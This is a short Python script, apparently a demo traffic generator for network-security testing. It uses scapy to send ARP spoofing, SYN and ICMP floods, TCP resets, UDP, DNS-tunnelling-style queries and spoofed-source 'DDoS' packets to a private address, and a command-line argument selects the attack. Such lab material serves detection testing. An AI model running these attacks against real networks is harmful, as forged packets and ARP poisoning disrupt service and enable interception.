from scapy.all import ARP, IP, TCP, UDP, ICMP, DNS, DNSQR, send
import time
import argparse
from scapy.all import conf

conf.verb = 0  # silenzia warning generali

TARGET_IP = "192.168.1.100"
TARGET_MAC = "ff:ff:ff:ff:ff:ff"
SRC_IP = "192.168.1.200"
SRC_MAC = "00:11:22:33:44:55"

# --- Attacchi ---
def demo_arp_spoof():
    print("[DEMO] ARP Spoofing...")
    pkt = ARP(op=2, psrc=SRC_IP, pdst=TARGET_IP, hwsrc=SRC_MAC, hwdst=TARGET_MAC)
    send(pkt, verbose=False)

def demo_syn_flood():
    print("[DEMO] SYN Flood...")
    for i in range(60):
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/TCP(sport=1234+i, dport=80, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.1)

def demo_icmp_flood():
    print("[DEMO] ICMP Flood...")
    for i in range(15):
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/ICMP(type=8)
        send(pkt, verbose=False)
        time.sleep(0.1)

def demo_tcp_reset():
    print("[DEMO] TCP Reset Attack...")
    for i in range(25):
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/TCP(sport=1234+i, dport=80, flags="R")
        send(pkt, verbose=False)
        time.sleep(0.1)

def demo_udp_amplification():
    print("[DEMO] UDP Amplification...")
    sizes = [10, 40, 50]
    for size in sizes:
        payload = b"A"*size
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/UDP(sport=1234, dport=1234)/payload
        send(pkt, verbose=False)
        time.sleep(0.1)

def demo_dns_tunneling():
    print("[DEMO] DNS Tunneling...")
    long_query = "verylongsubdomainname.example.com"
    for i in range(35):
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=long_query))
        send(pkt, verbose=False)
        time.sleep(0.1)

def demo_ddos():
    print("[DEMO] DDoS Simulation...")
    for i in range(35):
        src_ip = f"192.168.2.{i}"
        pkt = IP(src=src_ip, dst=TARGET_IP)/TCP(dport=80, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.1)

# --- Mappatura attacchi ---
ATTACKS = {
    "arp": demo_arp_spoof,
    "syn": demo_syn_flood,
    "icmp": demo_icmp_flood,
    "tcpreset": demo_tcp_reset,
    "udp": demo_udp_amplification,
    "dns": demo_dns_tunneling,
    "ddos": demo_ddos,
    "all": lambda: [func() for func in ATTACKS.values() if func != ATTACKS["all"]]
}

# --- Entry point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Demo attacchi rete")
    parser.add_argument(
        "attack",
        choices=ATTACKS.keys(),
        help="Scegli quale attacco lanciare: arp, syn, icmp, tcpreset, udp, dns, ddos, all"
    )
    args = parser.parse_args()
    ATTACKS[args.attack]()
    print("[DEMO] Attacco completato!")
